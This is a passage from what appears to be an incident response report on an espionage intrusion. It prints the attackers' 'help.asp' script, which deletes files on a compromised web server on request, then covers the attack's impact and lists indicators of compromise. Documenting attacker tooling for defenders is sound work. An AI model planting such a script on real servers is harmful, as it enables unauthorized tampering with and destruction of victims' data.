POST request and simply deletes the specified file in the hardcoded workdir (the\nURL has been removed to not disclose the web hoster).\n```\n<%\n\n```\n```\n        fn (filename)\n        workdir (the\n\n```\n```\nDim fileName\nDim workDir\nworkDir = \"C:\\WEB\\<URL>\\uploads\\img\\video\"\n\n```\n```\nfileName = Request.Form(\"fn\")\nIf Len(fileName) = 0 Then\n  Response.End\nEnd If\nDim objFSO, objFolder, fileItem\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\nSet objFolder = objFSO.getFolder(workDir)\nFor Each fileItem In objFolder.Files\n  If InStr(fileItem.Name, fileName) > 0 Then\n    Dim aFilePath\n    aFilePath = workDir & \"/\" & fileItem.Name\n    objFSO.DeleteFile aFilePath, True\n  End If\nNext\n%>\n\n```\n\nListing 21: help.asp file used for deleting files on webserver\n\n### 2.11 Impact\n\nNo direct impact of the attackers could be observed. This fact supports the assumption that the only\nobjective was the gathering of valuable data and their successful exfiltration. Beyond that, the attackers\nhad no interest in further impacting the victims.\n\nIn most cases, it appears that also the amount of compromised assets is at the required minimum level\nto operate smoothly and keep the C2 traffic alive. Servers were only compromised as far as necessary,\nmostly only files were collected. In case of lost C2 connectivity broader lateral movement and\ncompromise of systems was observed after reinfection.\n\n\n-----\n\n## 3 Appendix: Observed IOCs \n\nFor better accessibility we published the following IOCs on our GitHub repository: [https://github.com/hvs-](https://github.com/hvs-consulting/ioc_signatures)\n[consulting/ioc_signatures](https://github.com/hvs-consulting/ioc_signatures)\n\nNote that the threat actor hardly reused binaries with identical hashes across different machines. Therefore,\nthe focus in incident detection should be C2 addresses, process execution command lines and used file\nname schemas.\n\n### 3.1 Filenames, Hashes and Process Execution\n\nThe following table lists observed file names and gives known background information to the files. Hashes\nand process execution details can be found in
